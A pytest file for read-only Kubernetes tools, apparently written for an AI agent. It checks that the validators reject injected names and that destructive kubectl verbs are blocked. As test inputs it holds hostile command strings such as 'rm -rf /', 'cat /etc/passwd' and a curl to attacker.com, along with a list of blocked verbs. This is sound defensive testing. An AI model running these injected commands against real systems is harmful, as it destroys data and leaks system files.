"""Unit tests for read-only Kubernetes tools.

All tests use mocked subprocess — no real kubectl required.
"""

from __future__ import annotations

import subprocess
from unittest.mock import MagicMock, patch
from datetime import datetime, timezone

import pytest

from app.agent.state import ToolResult

pytestmark = pytest.mark.unit


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_proc(stdout: str = "", stderr: str = "", returncode: int = 0):
    """Build a mock subprocess.CompletedProcess."""
    mock = MagicMock(spec=subprocess.CompletedProcess)
    mock.stdout = stdout
    mock.stderr = stderr
    mock.returncode = returncode
    return mock


def _pod_list_stdout():
    return (
        "NAME                                    READY   STATUS    RESTARTS   AGE\n"
        "employment-management-abc123   1/1     Running   0          2d"
    )


def _crashloop_stdout():
    return (
        "NAME                                    READY   STATUS             RESTARTS\n"
        "employment-management-abc123   0/1     CrashLoopBackOff   5"
    )


# ---------------------------------------------------------------------------
# Validation helpers
# ---------------------------------------------------------------------------


class TestValidateK8sName:
    def test_valid_name(self):
        from app.tools.base import validate_k8s_name
        assert validate_k8s_name("my-pod-abc123") == "my-pod-abc123"

    def test_valid_name_with_slash(self):
        from app.tools.base import validate_k8s_name
        assert validate_k8s_name("pod/my-pod") == "pod/my-pod"

    def test_empty_name_raises(self):
        from app.tools.base import validate_k8s_name
        with pytest.raises(ValueError):
            validate_k8s_name("")

    def test_semicolon_injection_raises(self):
        from app.tools.base import validate_k8s_name
        with pytest.raises(ValueError):
            validate_k8s_name("pod; rm -rf /")

    def test_pipe_injection_raises(self):
        from app.tools.base import validate_k8s_name
        with pytest.raises(ValueError):
            validate_k8s_name("pod | cat /etc/passwd")

    def test_backtick_injection_raises(self):
        from app.tools.base import validate_k8s_name
        with pytest.raises(ValueError):
            validate_k8s_name("pod`id`")

    def test_dollar_injection_raises(self):
        from app.tools.base import validate_k8s_name
        with pytest.raises(ValueError):
            validate_k8s_name("pod$(id)")

    def test_newline_injection_raises(self):
        from app.tools.base import validate_k8s_name
        with pytest.raises(ValueError):
            validate_k8s_name("pod\nrm -rf /")

    def test_path_traversal_raises(self):
        from app.tools.base import validate_k8s_name
        with pytest.raises(ValueError):
            validate_k8s_name("../../../etc/passwd")

    def test_uppercase_raises(self):
        from app.tools.base import validate_k8s_name
        with pytest.raises(ValueError):
            validate_k8s_name("MyPod")


class TestValidateK8sNamespace:
    def test_valid_namespace(self):
        from app.tools.base import validate_k8s_namespace
        assert validate_k8s_namespace("employment-management") == "employment-management"

    def test_empty_raises(self):
        from app.tools.base import validate_k8s_namespace
        with pytest.raises(ValueError):
            validate_k8s_namespace("")

    def test_injection_raises(self):
        from app.tools.base import validate_k8s_namespace
        with pytest.raises(ValueError):
            validate_k8s_namespace("ns; rm -rf /")

    def test_uppercase_raises(self):
        from app.tools.base import validate_k8s_namespace
        with pytest.raises(ValueError):
            validate_k8s_namespace("MyNamespace")


class TestValidateKubectlVerb:
    def test_get_allowed(self):
        from app.tools.base import validate_kubectl_verb
        assert validate_kubectl_verb("get") == "get"

    def test_describe_allowed(self):
        from app.tools.base import validate_kubectl_verb
        assert validate_kubectl_verb("describe") == "describe"

    def test_logs_allowed(self):
        from app.tools.base import validate_kubectl_verb
        assert validate_kubectl_verb("logs") == "logs"

    def test_delete_blocked(self):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="explicitly blocked"):
            validate_kubectl_verb("delete")

    def test_apply_blocked(self):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="explicitly blocked"):
            validate_kubectl_verb("apply")

    def test_patch_blocked(self):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="explicitly blocked"):
            validate_kubectl_verb("patch")

    def test_edit_blocked(self):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="explicitly blocked"):
            validate_kubectl_verb("edit")

    def test_exec_blocked(self):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="explicitly blocked"):
            validate_kubectl_verb("exec")

    def test_scale_blocked(self):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="explicitly blocked"):
            validate_kubectl_verb("scale")

    def test_rollout_blocked(self):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="explicitly blocked"):
            validate_kubectl_verb("rollout")

    def test_create_blocked(self):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="explicitly blocked"):
            validate_kubectl_verb("create")

    def test_unknown_verb_not_allowed(self):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="not in the allowlist"):
            validate_kubectl_verb("arbitrary-command")


# ---------------------------------------------------------------------------
# GetPods
# ---------------------------------------------------------------------------


class TestGetPods:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(stdout=_pod_list_stdout())
        from app.tools.kubernetes.tools import GetPods
        tool = GetPods()
        result = tool.execute(namespace="employment-management")
        assert result.status == "success"
        assert result.exit_code == 0
        assert "Running" in result.stdout

    @patch("subprocess.run")
    def test_uses_correct_namespace(self, mock_run):
        mock_run.return_value = _make_proc(stdout=_pod_list_stdout())
        from app.tools.kubernetes.tools import GetPods
        tool = GetPods()
        tool.execute(namespace="employment-management")
        cmd = mock_run.call_args[0][0]
        assert "employment-management" in cmd
        assert "-n" in cmd

    @patch("subprocess.run")
    def test_kubectl_not_found(self, mock_run):
        mock_run.side_effect = FileNotFoundError("kubectl not found")
        from app.tools.kubernetes.tools import GetPods
        tool = GetPods()
        result = tool.execute(namespace="employment-management")
        assert result.status == "not_found"
        assert result.exit_code == -1

    @patch("subprocess.run")
    def test_kubectl_failure(self, mock_run):
        mock_run.return_value = _make_proc(
            stderr="Error from server: namespace not found",
            returncode=1,
        )
        from app.tools.kubernetes.tools import GetPods
        tool = GetPods()
        result = tool.execute(namespace="employment-management")
        assert result.status == "error"
        assert result.exit_code == 1

    def test_invalid_namespace_raises(self):
        from app.tools.kubernetes.tools import GetPods
        tool = GetPods()
        with pytest.raises(ValueError):
            tool.execute(namespace="ns; rm -rf /")

    @patch("subprocess.run")
    def test_timeout(self, mock_run):
        mock_run.side_effect = subprocess.TimeoutExpired(cmd=["kubectl"], timeout=30)
        from app.tools.kubernetes.tools import GetPods
        tool = GetPods(timeout=30)
        result = tool.execute(namespace="employment-management")
        assert result.status == "timeout"
        assert result.exit_code == -1

    @patch("subprocess.run")
    def test_no_shell_true(self, mock_run):
        mock_run.return_value = _make_proc()
        from app.tools.kubernetes.tools import GetPods
        tool = GetPods()
        tool.execute(namespace="employment-management")
        call_kwargs = mock_run.call_args[1]
        assert call_kwargs.get("shell") is False or "shell" not in call_kwargs


# ---------------------------------------------------------------------------
# DescribePod
# ---------------------------------------------------------------------------


class TestDescribePod:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(stdout="Name: my-pod\nStatus: Running")
        from app.tools.kubernetes.tools import DescribePod
        tool = DescribePod()
        result = tool.execute(pod_name="my-pod", namespace="employment-management")
        assert result.status == "success"
        assert result.resource == "my-pod"

    def test_injection_in_pod_name_raises(self):
        from app.tools.kubernetes.tools import DescribePod
        tool = DescribePod()
        with pytest.raises(ValueError):
            tool.execute(pod_name="my-pod; rm -rf /", namespace="employment-management")

    def test_empty_pod_name_raises(self):
        from app.tools.kubernetes.tools import DescribePod
        tool = DescribePod()
        with pytest.raises(ValueError):
            tool.execute(pod_name="", namespace="employment-management")

    @patch("subprocess.run")
    def test_missing_pod(self, mock_run):
        mock_run.return_value = _make_proc(
            stderr='Error from server (NotFound): pods "missing-pod" not found',
            returncode=1,
        )
        from app.tools.kubernetes.tools import DescribePod
        tool = DescribePod()
        result = tool.execute(pod_name="missing-pod", namespace="employment-management")
        assert result.status == "error"
        assert "NotFound" in result.stderr

    @patch("subprocess.run")
    def test_no_shell_true(self, mock_run):
        mock_run.return_value = _make_proc()
        from app.tools.kubernetes.tools import DescribePod
        tool = DescribePod()
        tool.execute(pod_name="my-pod", namespace="employment-management")
        call_kwargs = mock_run.call_args[1]
        assert call_kwargs.get("shell") is False or "shell" not in call_kwargs


# ---------------------------------------------------------------------------
# GetPodLogs
# ---------------------------------------------------------------------------


class TestGetPodLogs:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(stdout="INFO app started\nERROR crashed")
        from app.tools.kubernetes.tools import GetPodLogs
        tool = GetPodLogs()
        result = tool.execute(pod_name="my-pod", namespace="employment-management")
        assert result.status == "success"
        assert "ERROR" in result.stdout

    @patch("subprocess.run")
    def test_previous_flag(self, mock_run):
        mock_run.return_value = _make_proc(stdout="previous logs")
        from app.tools.kubernetes.tools import GetPodLogs
        tool = GetPodLogs()
        tool.execute(pod_name="my-pod", namespace="employment-management", previous=True)
        cmd = mock_run.call_args[0][0]
        assert "--previous" in cmd

    @patch("subprocess.run")
    def test_tail_lines_in_command(self, mock_run):
        mock_run.return_value = _make_proc(stdout="logs")
        from app.tools.kubernetes.tools import GetPodLogs
        tool = GetPodLogs()
        tool.execute(pod_name="my-pod", namespace="employment-management", tail_lines=200)
        cmd = mock_run.call_args[0][0]
        assert "--tail=200" in cmd

    def test_invalid_tail_lines_defaults_to_100(self):
        from app.tools.kubernetes.tools import GetPodLogs
        tool = GetPodLogs()
        # tail_lines is sanitised internally — no exception, defaults to 100
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = _make_proc()
            tool.execute(pod_name="my-pod", namespace="employment-management",
                         tail_lines=99999)
            cmd = mock_run.call_args[0][0]
            assert "--tail=100" in cmd

    def test_injection_in_container_raises(self):
        from app.tools.kubernetes.tools import GetPodLogs
        tool = GetPodLogs()
        with pytest.raises(ValueError):
            tool.execute(
                pod_name="my-pod",
                namespace="employment-management",
                container="container; rm -rf /",
            )


# ---------------------------------------------------------------------------
# GetEvents
# ---------------------------------------------------------------------------


class TestGetEvents:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(
            stdout="LAST SEEN  TYPE     REASON   OBJECT   MESSAGE\n"
                   "5m         Warning  BackOff  pod/my   Back-off"
        )
        from app.tools.kubernetes.tools import GetEvents
        tool = GetEvents()
        result = tool.execute(namespace="employment-management")
        assert result.status == "success"
        assert "BackOff" in result.stdout

    @patch("subprocess.run")
    def test_sorted_by_timestamp(self, mock_run):
        mock_run.return_value = _make_proc()
        from app.tools.kubernetes.tools import GetEvents
        tool = GetEvents()
        tool.execute(namespace="employment-management")
        cmd = mock_run.call_args[0][0]
        assert "--sort-by=.lastTimestamp" in cmd


# ---------------------------------------------------------------------------
# GetDeployment
# ---------------------------------------------------------------------------


class TestGetDeployment:
    @patch("subprocess.run")
    def test_list_all_deployments(self, mock_run):
        mock_run.return_value = _make_proc(
            stdout="NAME                    READY   UP-TO-DATE   AVAILABLE\n"
                   "employment-management   1/1     1            1"
        )
        from app.tools.kubernetes.tools import GetDeployment
        tool = GetDeployment()
        result = tool.execute(namespace="employment-management")
        assert result.status == "success"

    @patch("subprocess.run")
    def test_get_specific_deployment(self, mock_run):
        mock_run.return_value = _make_proc(stdout="employment-management deployment info")
        from app.tools.kubernetes.tools import GetDeployment
        tool = GetDeployment()
        result = tool.execute(
            deployment_name="employment-management",
            namespace="employment-management",
        )
        assert result.status == "success"
        assert result.resource == "employment-management"

    def test_injection_in_deployment_name_raises(self):
        from app.tools.kubernetes.tools import GetDeployment
        tool = GetDeployment()
        with pytest.raises(ValueError):
            tool.execute(deployment_name="deploy|id", namespace="employment-management")


# ---------------------------------------------------------------------------
# DescribeDeployment
# ---------------------------------------------------------------------------


class TestDescribeDeployment:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(stdout="Name: employment-management\nReplicas: 1")
        from app.tools.kubernetes.tools import DescribeDeployment
        tool = DescribeDeployment()
        result = tool.execute(
            deployment_name="employment-management",
            namespace="employment-management",
        )
        assert result.status == "success"

    def test_empty_name_raises(self):
        from app.tools.kubernetes.tools import DescribeDeployment
        tool = DescribeDeployment()
        with pytest.raises(ValueError):
            tool.execute(deployment_name="", namespace="employment-management")


# ---------------------------------------------------------------------------
# GetReplicaSets
# ---------------------------------------------------------------------------


class TestGetReplicaSets:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(
            stdout="NAME                           DESIRED   CURRENT   READY\n"
                   "employment-management-abc123   1         1         1"
        )
        from app.tools.kubernetes.tools import GetReplicaSets
        tool = GetReplicaSets()
        result = tool.execute(namespace="employment-management")
        assert result.status == "success"


# ---------------------------------------------------------------------------
# GetService / DescribeService
# ---------------------------------------------------------------------------


class TestGetService:
    @patch("subprocess.run")
    def test_list_services(self, mock_run):
        mock_run.return_value = _make_proc(
            stdout="NAME                    TYPE        CLUSTER-IP\n"
                   "employment-management   ClusterIP   10.96.0.1"
        )
        from app.tools.kubernetes.tools import GetService
        tool = GetService()
        result = tool.execute(namespace="employment-management")
        assert result.status == "success"

    def test_injection_raises(self):
        from app.tools.kubernetes.tools import GetService
        tool = GetService()
        with pytest.raises(ValueError):
            tool.execute(service_name="svc`whoami`", namespace="employment-management")


class TestDescribeService:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(stdout="Name: employment-management\nPort: 8080")
        from app.tools.kubernetes.tools import DescribeService
        tool = DescribeService()
        result = tool.execute(
            service_name="employment-management",
            namespace="employment-management",
        )
        assert result.status == "success"

    @patch("subprocess.run")
    def test_missing_service(self, mock_run):
        mock_run.return_value = _make_proc(
            stderr='Error from server (NotFound): services "missing" not found',
            returncode=1,
        )
        from app.tools.kubernetes.tools import DescribeService
        tool = DescribeService()
        result = tool.execute(service_name="missing", namespace="employment-management")
        assert result.status == "error"


# ---------------------------------------------------------------------------
# GetEndpointSlices
# ---------------------------------------------------------------------------


class TestGetEndpointSlices:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(
            stdout="NAME                     ADDRESSTYPE   PORTS\n"
                   "employment-management-x   IPv4          8080"
        )
        from app.tools.kubernetes.tools import GetEndpointSlices
        tool = GetEndpointSlices()
        result = tool.execute(namespace="employment-management")
        assert result.status == "success"


# ---------------------------------------------------------------------------
# Gateway / HTTPRoute
# ---------------------------------------------------------------------------


class TestGetGateway:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(stdout="NAME   CLASS   ADDRESS\ngw1    nginx   10.0.0.1")
        from app.tools.kubernetes.tools import GetGateway
        tool = GetGateway()
        result = tool.execute(namespace="employment-management")
        assert result.status == "success"

    def test_injection_raises(self):
        from app.tools.kubernetes.tools import GetGateway
        tool = GetGateway()
        with pytest.raises(ValueError):
            tool.execute(gateway_name="gw$(id)", namespace="employment-management")


class TestDescribeGateway:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(stdout="Name: gw1\nClass: nginx")
        from app.tools.kubernetes.tools import DescribeGateway
        tool = DescribeGateway()
        result = tool.execute(gateway_name="my-gateway", namespace="employment-management")
        assert result.status == "success"


class TestGetHTTPRoute:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(stdout="NAME   HOSTNAMES\nroute1   [\"example.com\"]")
        from app.tools.kubernetes.tools import GetHTTPRoute
        tool = GetHTTPRoute()
        result = tool.execute(namespace="employment-management")
        assert result.status == "success"

    def test_injection_raises(self):
        from app.tools.kubernetes.tools import GetHTTPRoute
        tool = GetHTTPRoute()
        with pytest.raises(ValueError):
            tool.execute(route_name="route;ls", namespace="employment-management")


class TestDescribeHTTPRoute:
    @patch("subprocess.run")
    def test_success(self, mock_run):
        mock_run.return_value = _make_proc(stdout="Name: route1\nParentRefs: gw1")
        from app.tools.kubernetes.tools import DescribeHTTPRoute
        tool = DescribeHTTPRoute()
        result = tool.execute(route_name="my-route", namespace="employment-management")
        assert result.status == "success"


# ---------------------------------------------------------------------------
# Tool registry
# ---------------------------------------------------------------------------


class TestKubernetesToolRegistry:
    def test_all_14_tools_registered(self):
        from app.tools.kubernetes.tools import KUBERNETES_TOOLS
        expected = {
            "get_pods", "describe_pod", "get_pod_logs", "get_events",
            "get_deployment", "describe_deployment", "get_replicasets",
            "get_service", "describe_service", "get_endpointslices",
            "get_gateway", "describe_gateway", "get_httproute", "describe_httproute",
        }
        assert set(KUBERNETES_TOOLS.keys()) == expected

    def test_get_tool_by_name(self):
        from app.tools.kubernetes.tools import get_kubernetes_tool
        tool = get_kubernetes_tool("get_pods")
        assert tool.tool_name == "get_pods"

    def test_unknown_tool_raises(self):
        from app.tools.kubernetes.tools import get_kubernetes_tool
        with pytest.raises(ValueError, match="Unknown Kubernetes tool"):
            get_kubernetes_tool("rm_all_pods")


# ---------------------------------------------------------------------------
# Security: command injection resistance
# ---------------------------------------------------------------------------


class TestCommandInjectionResistance:
    """Verify tools cannot be used to run arbitrary commands."""

    INJECTION_ATTEMPTS = [
        "pod; rm -rf /",
        "pod && curl http://attacker.com",
        "pod | cat /etc/passwd",
        "pod`id`",
        "pod$(whoami)",
        "pod\nrm -rf /",
        "pod\x00evil",
        "../../../etc/passwd",
        "pod --force --grace-period=0",
    ]

    @pytest.mark.parametrize("malicious_name", INJECTION_ATTEMPTS)
    def test_describe_pod_rejects_injection(self, malicious_name):
        from app.tools.kubernetes.tools import DescribePod
        tool = DescribePod()
        with pytest.raises(ValueError):
            tool.execute(pod_name=malicious_name, namespace="employment-management")

    @pytest.mark.parametrize("malicious_name", INJECTION_ATTEMPTS)
    def test_get_pod_logs_rejects_injection(self, malicious_name):
        from app.tools.kubernetes.tools import GetPodLogs
        tool = GetPodLogs()
        with pytest.raises(ValueError):
            tool.execute(pod_name=malicious_name, namespace="employment-management")

    @pytest.mark.parametrize("malicious_name", INJECTION_ATTEMPTS)
    def test_namespace_injection_rejected(self, malicious_name):
        from app.tools.kubernetes.tools import GetPods
        tool = GetPods()
        with pytest.raises(ValueError):
            tool.execute(namespace=malicious_name)


# ---------------------------------------------------------------------------
# Security: destructive operations blocked
# ---------------------------------------------------------------------------


class TestDestructiveOperationsBlocked:
    BLOCKED_VERBS = [
        "delete", "apply", "patch", "edit", "exec",
        "scale", "rollout", "create", "replace", "run",
        "expose", "set", "drain", "cordon", "uncordon",
    ]

    @pytest.mark.parametrize("verb", BLOCKED_VERBS)
    def test_blocked_verb_raises(self, verb):
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError):
            validate_kubectl_verb(verb)

    def test_no_tool_accepts_delete_verb(self):
        """No Kubernetes tool class should ever call validate_kubectl_verb('delete')."""
        from app.tools.base import validate_kubectl_verb
        with pytest.raises(ValueError, match="explicitly blocked"):
            validate_kubectl_verb("delete")

    def test_no_shell_true_in_base_tool(self):
        """Verify BaseTool._run_subprocess explicitly sets shell=False."""
        import inspect, re
        from app.tools.base import BaseTool
        source = inspect.getsource(BaseTool._run_subprocess)
        # Must explicitly set shell=False
        assert re.search(r"shell\s*=\s*False", source), (
            "BaseTool._run_subprocess must explicitly set shell=False"
        )
        # Must not assign shell=True (comments containing the string are fine)
        assert not re.search(r"shell\s*=\s*True", source), (
            "BaseTool._run_subprocess must never assign shell=True"
        )
